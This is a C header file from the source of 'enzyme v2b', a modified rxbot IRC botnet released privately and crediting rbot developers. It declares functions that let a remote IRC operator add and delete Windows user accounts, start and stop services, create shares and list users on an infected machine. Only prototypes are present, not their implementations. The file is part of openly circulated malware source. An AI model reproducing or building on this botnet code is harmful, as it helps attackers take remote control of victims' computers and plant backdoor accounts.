/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#ifndef NO_NET
enum {NET_ADD, NET_DELETE, NET_INFO, NET_START, NET_STOP, NET_PAUSE, NET_CONTINUE};

#define IsVSD(x) ((x)?("Yes"):("No"))

typedef struct NetCommand
{
	char *action;
	char *completed;
	DWORD control;

} NetCommand;

char *Services(int action, char *ServiceName);
DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl=0, DWORD nArg=0, LPCTSTR *pArg=NULL);
static char *ServiceError(DWORD svcError);
BOOL ListServices(SOCKET sock, char *chan, BOOL notice);
char *Shares(int action, char *ShareName, char *SharePath=NULL);
static char *AsWideString(const char *cszANSIstring);
char *AsAnsiString(const WCHAR *cszWIDEstring);
NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath);
NET_API_STATUS ShareDel(char *ServerName, char *ShareName);
BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName=NULL);
char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice);
NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password);
NET_API_STATUS UserDel(char *ServerName, char *Username);
NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice);
BOOL ListUsers(SOCKET sock, char *chan, BOOL noice, char *ServerName=NULL);
static char *NasError(NET_API_STATUS nStatus);
char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice);
#endif
